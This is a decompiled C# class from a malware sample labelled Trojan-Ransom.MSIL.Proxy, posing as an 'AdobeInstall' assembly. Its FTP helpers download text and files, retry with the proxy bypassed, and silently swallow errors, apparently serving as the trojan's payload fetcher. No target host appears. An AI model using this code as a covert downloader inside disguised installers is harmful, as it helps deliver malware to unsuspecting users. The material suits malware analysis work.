// Decompiled with JetBrains decompiler
// Type: AdobeInstall.FtpHelper
// Assembly: AdobeInstall, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1C53397E-A7A7-4B3B-A278-6486ABC938B2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.i-1f7fbdf81b92b1b310416936ecfb11555a6f96bda724446ec2ed7428f56c57b3.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net;

namespace AdobeInstall
{
  public class FtpHelper
  {
    public static string DownloadText(string uri)
    {
      string Left = FtpHelper.DownloadText(uri, false);
      if (Operators.CompareString(Left, "", false) == 0)
        Left = FtpHelper.DownloadText(uri, true);
      return Left;
    }

    public static string DownloadText(string uri, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }

    public static bool DownloadFile(string url, string aFile)
    {
      bool flag = FtpHelper.DownloadFile(url, aFile, false);
      if (!flag)
        flag = FtpHelper.DownloadFile(url, aFile, true);
      return flag;
    }

    public static bool DownloadFile(string url, string aFile, bool noproxy)
    {
      bool flag;
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(url);
        ftpWebRequest.KeepAlive = false;
        ftpWebRequest.UseBinary = true;
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        using (FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse())
        {
          using (Stream responseStream = response.GetResponseStream())
          {
            using (FileStream fileStream = new FileStream(aFile, FileMode.Create))
            {
              byte[] numArray = new byte[2048];
              int count;
              do
              {
                count = responseStream.Read(numArray, 0, numArray.Length);
                fileStream.Write(numArray, 0, count);
              }
              while (count != 0);
              responseStream.Close();
              fileStream.Flush();
              fileStream.Close();
            }
            responseStream.Close();
          }
        }
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static bool IsInternet() => true;
  }
}
